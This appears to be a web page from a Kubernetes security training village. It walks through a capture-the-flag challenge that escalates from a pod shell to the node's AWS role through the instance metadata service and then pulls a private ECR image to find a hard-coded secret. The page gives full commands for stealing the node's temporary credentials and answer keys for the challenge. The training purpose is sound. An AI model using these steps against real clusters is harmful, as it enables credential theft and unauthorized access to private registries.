@@ -1,0 +1,778 @@
+
+<!doctype html>
+<html lang="en" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+        <meta name="description" content="Puma Security's Hackers Teaching Hackers (HTH) 2024 Kubernetes Village">
+      
+      
+        <meta name="author" content="Eric Johnson">
+      
+      
+      
+        <link rel="prev" href="../api-key/">
+      
+      
+      
+      <link rel="icon" href="../img/pumasecurity.png">
+      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.5.44">
+    
+    
+      
+        <title>Cascadia CVR - HTH 2024 Kubernetes Security Village</title>
+      
+    
+    
+      <link rel="stylesheet" href="../assets/stylesheets/main.0253249f.min.css">
+      
+        
+        <link rel="stylesheet" href="../assets/stylesheets/palette.06af60db.min.css">
+      
+      
+
+
+    
+    
+      
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CSource+Code+Pro:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Roboto";--md-code-font:"Source Code Pro"}</style>
+      
+    
+    
+      <link rel="stylesheet" href="../css/jquery.fancybox.min.css">
+    
+      <link rel="stylesheet" href="../css/html.css">
+    
+      <link rel="stylesheet" href="../css/custom.css">
+    
+    <script>__md_scope=new URL("..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+    
+  </head>
+  
+  
+    
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="slate" data-md-color-primary="indigo" data-md-color-accent="indigo">
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#cascadia-cockpit-voice-recorders-cvr" class="md-skip">
+          Skip to content
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+  
+
+<header class="md-header md-header--shadow" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="Header">
+    <a href=".." title="HTH 2024 Kubernetes Security Village" class="md-header__button md-logo" aria-label="HTH 2024 Kubernetes Security Village" data-md-component="logo">
+      
+  <img src="../img/pumasecurity.png" alt="logo">
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            HTH 2024 Kubernetes Security Village
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              Cascadia CVR
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+      
+    
+    
+    
+    
+      <label class="md-header__button md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+      </label>
+      <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="Search">
+        
+        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
+        </button>
+      </nav>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            Initializing search
+          </div>
+          <ol class="md-search-result__list" role="presentation"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+    
+  </nav>
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+
+<nav class="md-nav md-nav--primary" aria-label="Navigation" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href=".." title="HTH 2024 Kubernetes Security Village" class="md-nav__button md-logo" aria-label="HTH 2024 Kubernetes Security Village" data-md-component="logo">
+      
+  <img src="../img/pumasecurity.png" alt="logo">
+
+    </a>
+    HTH 2024 Kubernetes Security Village
+  </label>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href=".." class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Home
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../initial-access/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Initial Access
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../airborneio-24/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Airborneio-24
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../shadowhawk/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Shadowhawk
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../api-key/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    API Key
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+    
+  
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+        
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          
+  
+  <span class="md-ellipsis">
+    Cascadia CVR
+  </span>
+  
+
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
+        
+  
+  <span class="md-ellipsis">
+    Cascadia CVR
+  </span>
+  
+
+      </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#pod-permission-inheritance" class="md-nav__link">
+    <span class="md-ellipsis">
+      Pod Permission Inheritance
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#private-registry-image-access" class="md-nav__link">
+    <span class="md-ellipsis">
+      Private Registry Image Access
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#conclusion" class="md-nav__link">
+    <span class="md-ellipsis">
+      Conclusion
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#pod-permission-inheritance" class="md-nav__link">
+    <span class="md-ellipsis">
+      Pod Permission Inheritance
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#private-registry-image-access" class="md-nav__link">
+    <span class="md-ellipsis">
+      Private Registry Image Access
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#conclusion" class="md-nav__link">
+    <span class="md-ellipsis">
+      Conclusion
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              <article class="md-content__inner md-typeset">
+                
+                  
+
+
+<h1 id="cascadia-cockpit-voice-recorders-cvr">Cascadia Cockpit Voice Recorders (CVR)</h1>
+<p>The <em>Cascadia Cockpit Voice Recorders (CVR)</em> challenge requires you to find a flag stored in a private <a href="https://docs.aws.amazon.com/AmazonECR/latest/userguide/docker-pull-ecr-image.html" rel="noopener" target="_blank">Elastic Container Registry (ECR) image</a>. Unfortunately, the <em>kubeace-maverick</em> IAM user does not have permissions to pull images from the ECR repository. Without direct access to ECR, you will need to use the <a href="https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ec2-instance-metadata.html" rel="noopener" target="_blank">AWS Instance Metadata Service IMDS</a> to escalate your AWS permissions and pull the private image from ECR.</p>
+<h2 id="pod-permission-inheritance">Pod Permission Inheritance</h2>
+<p>During the <a href="../shadowhawk/#pod-permission-inheritance" rel="noopener" target="_blank">Shadowhawk Challenge</a>, you learned that pods can escalate permissions by calling the node's instance metadata service (IMDS),  the permissions of the service account associated with the pod. In the <em>Cascadia Cockpit Voice Recorders (CVR)</em> challenge, you will need to use that privilege escalation technique again to access the private container image stored in the Elastic Container Registry (ECR).</p>
+<ol>
+<li>
+<p>Using your Terminal, verify that <em>kubeace-maverick</em> IAM user does not have access to describe the ECR repositories in the AWS account hosting the EKS cluster. What error message is returned?</p>
+<details class="tip">
+<summary>Hint</summary>
+<p>Run <code>aws ecr describe-repositories</code> command to list the ECR repositories in the AWS account.</p>
+<div class="highlight"><pre><span></span><code>aws<span class="w"> </span>ecr<span class="w"> </span>describe-repositories
+</code></pre></div>
+</details>
+<details class="success">
+<summary>Answer</summary>
+<p>The describe repositories command will return an unauthorized error because the <em>kubeace-maverick</em> IAM user does not have access to the ECR repositories in the account.</p>
+<div class="admonition abstract">
+<p class="admonition-title">Expected Output</p>
+<div class="highlight"><pre><span></span><code>An error occurred (AccessDeniedException) when calling the DescribeRepositories operation: User: arn:aws:iam::123456789012:user/kubeace-maverick-randomid is not authorized to perform: ecr:DescribeRepositories on resource: arn:aws:ecr:us-west-2:123456789012:repository/* because no identity-based policy allows the ecr:DescribeRepositories action
+</code></pre></div>
+</div>
+</details>
+</li>
+<li>
+<p>Use the <a href="https://microsoft.github.io/Threat-Matrix-for-Kubernetes/techniques/Instance%20Metadata%20API/" rel="noopener" target="_blank">Instance Metadata API</a> attacker technique again to obtain temporary credentials from the node. Use the <code>kubectl exec</code> command to obtain a shell on the <code>ui</code> pod and exfiltrate credentials from the node's instance metadata service (IMDS). What is the name of the IAM role attached to the Kubernetes node? What IMDS endpoint can read temporary credentials for the IAM role?</p>
+<details class="tip">
+<summary>Hint</summary>
+<ul>
+<li>
+<p>List the pods running in the <code>hth</code> namespace. Make a note of the <em>ui</em> pod's name, as you will need this in the next step.</p>
+<div class="highlight"><pre><span></span><code>kubectl<span class="w"> </span>get<span class="w"> </span>pods<span class="w"> </span>-n<span class="w"> </span>hth
+</code></pre></div>
+<div class="admonition abstract">
+<p class="admonition-title">Expected Output</p>
+<div class="highlight"><pre><span></span><code>NAME<span class="w">            </span>READY<span class="w">   </span>STATUS<span class="w">    </span>RESTARTS<span class="w">   </span>AGE
+api-randomid<span class="w">    </span><span class="m">1</span>/1<span class="w">     </span>Running<span class="w">   </span><span class="m">0</span><span class="w">          </span>2d21h
+ui-randomid<span class="w">     </span><span class="m">1</span>/1<span class="w">     </span>Running<span class="w">   </span><span class="m">0</span><span class="w">          </span>2d21h
+</code></pre></div>
+</div>
+</li>
+<li>
+<p>Use the <code>kubectl exec</code> command to obtain a shell on the <code>ui</code> pod.</p>
+<div class="highlight"><pre><span></span><code>kubectl<span class="w"> </span><span class="nb">exec</span><span class="w"> </span>--stdin<span class="w"> </span>--tty<span class="w"> </span>-n<span class="w"> </span>hth<span class="w"> </span>ENTER_UI_POD_NAME<span class="w"> </span>--<span class="w"> </span>/bin/bash
+</code></pre></div>
+<div class="admonition abstract">
+<p class="admonition-title">Expected Output</p>
+<div class="highlight"><pre><span></span><code>root@ui-randomid:/#
+</code></pre></div>
+</div>
+</li>
+<li>
+<p>Once inside the pod, query the IMDS endpoint (169.254.169.254) to view the list of IAM roles with security credentials on the node.</p>
+<div class="highlight"><pre><span></span><code>curl<span class="w"> </span>http://169.254.169.254/latest/meta-data/iam/security-credentials/<span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span>echo<span class="p">;</span>
+</code></pre></div>
+</li>
+<li>
+<p>Use the role's name to view the role's temporary security credentials. Make a note of the <strong>AccessKeyId</strong>, <strong>SecretAccessKey</strong>, and <strong>Token</strong> values for the next step.</p>
+<div class="highlight"><pre><span></span><code>curl<span class="w"> </span>http://169.254.169.254/latest/meta-data/iam/security-credentials/?????/<span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span>echo<span class="p">;</span>
+</code></pre></div>
+<div class="admonition abstract">
+<p class="admonition-title">Expected Output</p>
+<div class="highlight"><pre><span></span><code><span class="o">{</span>
+<span class="w">  </span>...
+<span class="w">  </span><span class="s2">&quot;Type&quot;</span><span class="w"> </span>:<span class="w"> </span><span class="s2">&quot;AWS-HMAC&quot;</span>,
+<span class="hll"><span class="w">  </span><span class="s2">&quot;AccessKeyId&quot;</span><span class="w"> </span>:<span class="w"> </span><span class="s2">&quot;?????&quot;</span>,
+</span><span class="hll"><span class="w">  </span><span class="s2">&quot;SecretAccessKey&quot;</span><span class="w"> </span>:<span class="w"> </span><span class="s2">&quot;?????&quot;</span>,
+</span><span class="hll"><span class="w">  </span><span class="s2">&quot;Token&quot;</span><span class="w"> </span>:<span class="w"> </span><span class="s2">&quot;?????&quot;</span>,
+</span><span class="w">  </span>...
+<span class="o">}</span>
+</code></pre></div>
+</div>
+</li>
+<li>
+<p>Run the following command to exit the shell and return to your local machine.</p>
+<div class="highlight"><pre><span></span><code><span class="nb">exit</span>
+</code></pre></div>
+</li>
+</ul>
+</details>
+<details class="success">
+<summary>Answer</summary>
+<p>The AWS IAM Role attached to the Kubernetes node is <strong>hth-node-role-randomid</strong>. Which tells you that the command to obtain temporary credentials is...</p>
+<div class="highlight"><pre><span></span><code>curl<span class="w"> </span>http://169.254.169.254/latest/meta-data/iam/security-credentials/hth-node-role-randomid/
+</code></pre></div>
+</details>
+</li>
+</ol>
+<h2 id="private-registry-image-access">Private Registry Image Access</h2>
+<p>The <a href="https://microsoft.github.io/Threat-Matrix-for-Kubernetes/techniques/images%20from%20a%20private%20registry/" rel="noopener" target="_blank">Private Registry Images</a> attacker technique uses credentials stored on the Kubernetes node to gain unauthorized access to container image repositories. <a href="https://kubernetes.io/docs/tasks/configure-pod-container/pull-image-private-registry/" rel="noopener" target="_blank">Image pull credentials</a> can be used to access a private container repository, but the cloud provider's each have a their own recommended authentication process.</p>
+<p>Use the node's temporary credentials to <a href="https://docs.aws.amazon.com/AmazonECR/latest/userguide/docker-pull-ecr-image.html" rel="noopener" target="_blank">pull the private image from the account's ECR repository</a> exfiltrate the <strong>Cascadia CVR</strong> flag from ECR.</p>
+<ol>
+<li>
+<p>Open a new Terminal on your machine and set the required <a href="https://docs.aws.amazon.com/cli/v1/userguide/cli-configure-envvars.html" rel="noopener" target="_blank">AWS CLI environment variables</a> to use the node's temporary credentials. What is the name of the ECR repository and URL that contains the <code>cascadia</code> flag.</p>
+<details class="tip">
+<summary>Hint</summary>
+<ul>
+<li>
+<p>Make sure you open a new Terminal session. Then, set each of the following environment variables to the configure the new Terminal session. Replace the <code>NODE_ROLE_ACCESS_KEY_ID</code>, <code>NODE_ROLE_SECRET_ACCESS_KEY</code>, and <code>NODE_ROLE_SESSION_TOKEN</code> placeholders with the values obtained from the previous step.</p>
+<div class="highlight"><pre><span></span><code><span class="nb">export</span><span class="w"> </span><span class="nv">AWS_ACCESS_KEY_ID</span><span class="o">=</span>ENTER_NODE_ROLE_ACCESS_KEY_ID
+<span class="nb">export</span><span class="w"> </span><span class="nv">AWS_SECRET_ACCESS_KEY</span><span class="o">=</span>ENTER_NODE_ROLE_SECRET_ACCESS_KEY
+<span class="nb">export</span><span class="w"> </span><span class="nv">AWS_SESSION_TOKEN</span><span class="o">=</span>ENTER_NODE_ROLE_SESSION_TOKEN
+<span class="nb">export</span><span class="w"> </span><span class="nv">AWS_DEFAULT_REGION</span><span class="o">=</span>us-west-2
+</code></pre></div>
+</li>
+<li>
+<p>Run the <code>aws sts get-caller-identity</code> command to verify you have properly configured the IAM role's temporary credentials. The output should show you are authenticating as the node's EC2 instance profile role.</p>
+<div class="highlight"><pre><span></span><code>aws<span class="w"> </span>sts<span class="w"> </span>get-caller-identity
+</code></pre></div>
+<div class="admonition abstract">
+<p class="admonition-title">Expected Output</p>
+<div class="highlight"><pre><span></span><code><span class="go">{</span>
+<span class="go">  &quot;UserId&quot;: &quot;AROASZY2ZSU65B7QQKFEP:i-0304eb3fda5d5c44d&quot;,</span>
+<span class="go">  &quot;Account&quot;: &quot;123456789012&quot;,</span>
+<span class="go">  &quot;Arn&quot;: &quot;arn:aws:sts::123456789012:assumed-role/hth-node-role-random-id/i-0304eb3fda5d5c44d&quot;</span>
+<span class="go">}</span>
+</code></pre></div>
+</div>
+</li>
+<li>
+<p>List all of the ECR repositories in the account. The output will show one container repository that contains the <strong>cascadia</strong> flag. Make a note of the <strong>repositoryUri</strong> value for the next step.</p>
+<div class="highlight"><pre><span></span><code>aws<span class="w"> </span>ecr<span class="w"> </span>describe-repositories
+</code></pre></div>
+<div class="admonition abstract">
+<p class="admonition-title">Expected Output</p>
+<div class="highlight"><pre><span></span><code><span class="go">{</span>
+<span class="go">  &quot;repositories&quot;: [</span>
+<span class="go">    {</span>
+<span class="go">        &quot;repositoryArn&quot;: &quot;arn:aws:ecr:us-west-2:123456789012:repository/hth-api-randomid&quot;,</span>
+<span class="go">        &quot;registryId&quot;: &quot;123456789012&quot;,</span>
+<span class="hll"><span class="go">        &quot;repositoryName&quot;: &quot;?????&quot;,</span>
+</span><span class="hll"><span class="go">        &quot;repositoryUri&quot;: &quot;?????&quot;,</span>
+</span><span class="go">        &quot;createdAt&quot;: &quot;2024-11-13T18:58:33.370000-05:00&quot;,</span>
+<span class="go">        &quot;imageTagMutability&quot;: &quot;MUTABLE&quot;,</span>
+<span class="go">        &quot;imageScanningConfiguration&quot;: {</span>
+<span class="go">          &quot;scanOnPush&quot;: false</span>
+<span class="go">        },</span>
+<span class="go">        &quot;encryptionConfiguration&quot;: {</span>
+<span class="go">          &quot;encryptionType&quot;: &quot;AES256&quot;</span>
+<span class="go">        }</span>
+<span class="go">      }</span>
+<span class="go">    ]</span>
+<span class="go">}</span>
+</code></pre></div>
+</div>
+</li>
+</ul>
+</details>
+<details class="success">
+<summary>Answer</summary>
+<p>The ECR repository that contains the <code>cascadia</code> flag is <strong>hth-api-randomid</strong>.</p>
+<div class="admonition abstract">
+<p class="admonition-title">Expected Output</p>
+<div class="highlight"><pre><span></span><code><span class="go">&quot;repositoryName&quot;: &quot;hth-api-randomid&quot;,</span>
+<span class="go">&quot;repositoryUri&quot;: &quot;123456789012.dkr.ecr.us-west-2.amazonaws.com/hth-api-randomid&quot;,</span>
+</code></pre></div>
+</div>
+</details>
+</li>
+<li>
+<p>Use the <code>aws ecr list-images</code> command to enumerate the images in the ECR repository. What is the name of the image and tag that contains the <strong>cascadia</strong> flag?</p>
+<details class="tip">
+<summary>Hint</summary>
+<ul>
+<li>
+<p>Run the <code>aws ecr list-images</code> command to list the images in the ECR repository. Make a note of the <strong>imageTag</strong> value for the next step.</p>
+<div class="highlight"><pre><span></span><code>aws<span class="w"> </span>ecr<span class="w"> </span>list-images<span class="w"> </span>--repository-name<span class="w"> </span>?????
+</code></pre></div>
+<div class="admonition abstract">
+<p class="admonition-title">Expected Output</p>
+<div class="highlight"><pre><span></span><code><span class="go">{</span>
+<span class="go">  &quot;imageIds&quot;: [</span>
+<span class="go">    {</span>
+<span class="hll"><span class="go">      &quot;imageDigest&quot;: &quot;sha256:?????&quot;,</span>
+</span><span class="hll"><span class="go">      &quot;imageTag&quot;: &quot;?????&quot;</span>
+</span><span class="go">    }</span>
+<span class="go">  ]</span>
+<span class="go">}</span>
+</code></pre></div>
+</div>
+</li>
+</ul>
+</details>
+<details class="success">
+<summary>Answer</summary>
+<p>The list images command confirms an image with a <em>tag</em> value of <strong>cascadia</strong> exists in the <strong>hth-api-randomid</strong> ECR repository.</p>
+<div class="admonition abstract">
+<p class="admonition-title">Expected Output</p>
+<div class="highlight"><pre><span></span><code><span class="go">&quot;imageDigest&quot;: &quot;sha256:?????&quot;,</span>
+<span class="go">&quot;imageTag&quot;: &quot;cascadia&quot;</span>
+</code></pre></div>
+</div>
+</details>
+</li>
+<li>
+<p>Use the <code>aws ecr get-login-password</code> command to <a href="https://docs.aws.amazon.com/AmazonECR/latest/userguide/registry_auth.html" rel="noopener" target="_blank">authenticate to the ECR repository</a>. Then, use the <strong>repositoryUri</strong> and <strong>imageTag</strong> values to pull the private image from the ECR repository. What is the size of the <code>cascadia</code> image?</p>
+<details class="tip">
+<summary>Hint</summary>
+<ul>
+<li>
+<p>Run the <code>aws ecr get-login-password</code> command to obtain an authentication token for the ECR repository and pass the token to the <code>docker login</code> command. You need to set the <code>accountid</code> and <code>region</code> placeholders with the values from the previous steps.</p>
+<div class="highlight"><pre><span></span><code>aws<span class="w"> </span>ecr<span class="w"> </span>get-login-password<span class="w"> </span><span class="p">|</span><span class="w"> </span>docker<span class="w"> </span>login<span class="w"> </span>--username<span class="w"> </span>AWS<span class="w"> </span>--password-stdin<span class="w"> </span>accountid.dkr.ecr.region.amazonaws.com
+</code></pre></div>
+</li>
+<li>
+<p>Use the <code>docker pull</code> command to pull the <code>cascadia</code> image from the ECR repository. You need to set the <strong>repositoryUri</strong> and <strong>imageTag</strong> placeholders with the values from the previous steps.</p>
+<div class="highlight"><pre><span></span><code>docker<span class="w"> </span>pull<span class="w"> </span>repositoryUri:imageTag
+</code></pre></div>
+</li>
+<li>
+<p>Run the <code>docker images</code> command to verify the image was downloaded to your machine and see the image size.</p>
+</li>
+</ul>
+</details>
+<details class="success">
+<summary>Answer</summary>
+<p>The commands to sign into the ECR repository and pull the image are as follows. Remember, you will need to replace the AWS account id, region, and randomid placeholder values in your command.</p>
+<div class="highlight"><pre><span></span><code>aws<span class="w"> </span>ecr<span class="w"> </span>get-login-password<span class="w"> </span><span class="p">|</span><span class="w"> </span>docker<span class="w"> </span>login<span class="w"> </span>--username<span class="w"> </span>AWS<span class="w"> </span>--password-stdin<span class="w"> </span>accountid.dkr.ecr.region.amazonaws.com
+docker<span class="w"> </span>pull<span class="w"> </span>accountid.dkr.ecr.region.amazonaws.com/hth-api-randomid
+docker<span class="w"> </span>images<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>cascadia
+</code></pre></div>
+<div class="admonition abstract">
+<p class="admonition-title">Expected Output</p>
+<div class="highlight"><pre><span></span><code><span class="go">REPOSITORY                                      TAG       IMAGE ID       CREATED        SIZE</span>
+<span class="go">123456789012.dkr.ecr.region.amazonaws.com/hth-api-randomid                  cascadia             5cdf199d2874   8 hours ago     131MB</span>
+</code></pre></div>
+</div>
+</details>
+</li>
+<li>
+<p>Run the <code>docker save</code> command to save the <code>cascadia</code> image as a <strong>tar</strong> file on your machine. Extract the tar file and search the image layers for the <code>CASCADIA_CVR_KEY</code> flag.</p>
+<details class="tip">
+<summary>Hint</summary>
+<ul>
+<li>
+<p>Run the <code>docker save</code> command to save the <code>cascadia</code> image as a <strong>tar</strong> file on your machine. You need to set the <strong>repositoryUri</strong> and <strong>imageTag</strong> placeholders with the values from the previous steps.</p>
+<div class="highlight"><pre><span></span><code>docker<span class="w"> </span>save<span class="w"> </span>repositoryUri:imageTag<span class="w"> </span>&gt;<span class="w"> </span>/path/to/cascadia.tar
+</code></pre></div>
+</li>
+<li>
+<p>Extract the tar file and search the image layers for the <code>cascadia</code> flag.</p>
+<div class="highlight"><pre><span></span><code>tar<span class="w"> </span>-xvf<span class="w"> </span>/path/to/cascadia.tar<span class="w"> </span>-C<span class="w"> </span>/path/to/directory
+<span class="nb">cd</span><span class="w"> </span>/path/to/directory
+grep<span class="w"> </span>-r<span class="w"> </span><span class="s2">&quot;CASCADIA&quot;</span>
+</code></pre></div>
+</li>
+</ul>
+<div class="admonition abstract">
+<p class="admonition-title">Expected Output</p>
+<div class="highlight"><pre><span></span><code><span class="go">&quot;CASCADIA_CVR_KEY=hth{?????}</span>
+</code></pre></div>
+</div>
+</details>
+</li>
+</ol>
+<h2 id="conclusion">Conclusion</h2>
+<p>You have successfully completed the <em>Cascadia Cockpit Voice Recorders (CVR)</em> challenge. You used the <a href="https://microsoft.github.io/Threat-Matrix-for-Kubernetes/techniques/Instance%20Metadata%20API/" rel="noopener" target="_blank">Instance Metadata API</a> to escalate your permissions and access the private ECR repository. You then used the credentials to gain access to the Cascadia private image, extract the image layers, and search for a hard-coded secret stored in an environment variable.</p>
+<p>Congratulations! You have completed the Hackers Teaching Hackers 2024 Kubernetes Security Village.</p>
+
+
+
+
+
+
+
+
+
+
+
+
+                
+              </article>
+            </div>
+          
+          
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+        </div>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+    <div class="md-copyright__highlight">
+      ©2024 Puma Security, LLC. All rights reserved.
+    </div>
+  
+  
+    Made with
+    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+      Material for MkDocs
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    
+    <script id="__config" type="application/json">{"base": "..", "features": ["navigation.instant", "navigation.indexes", "content.code.annotate", "content.code.copy", {"header.autohide": false}], "search": "../assets/javascripts/workers/search.6ce7567c.min.js", "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}}</script>
+    
+    
+      <script src="../assets/javascripts/bundle.83f73b43.min.js"></script>
+      
+        <script src="../js/jquery.min.js"></script>
+      
+        <script src="../js/jquery.fancybox.min.js"></script>
+      
+        <script src="../js/workbook.js"></script>
+      
+        <script src="../js/custom.js"></script>
+      
+    
+  </body>
+</html>
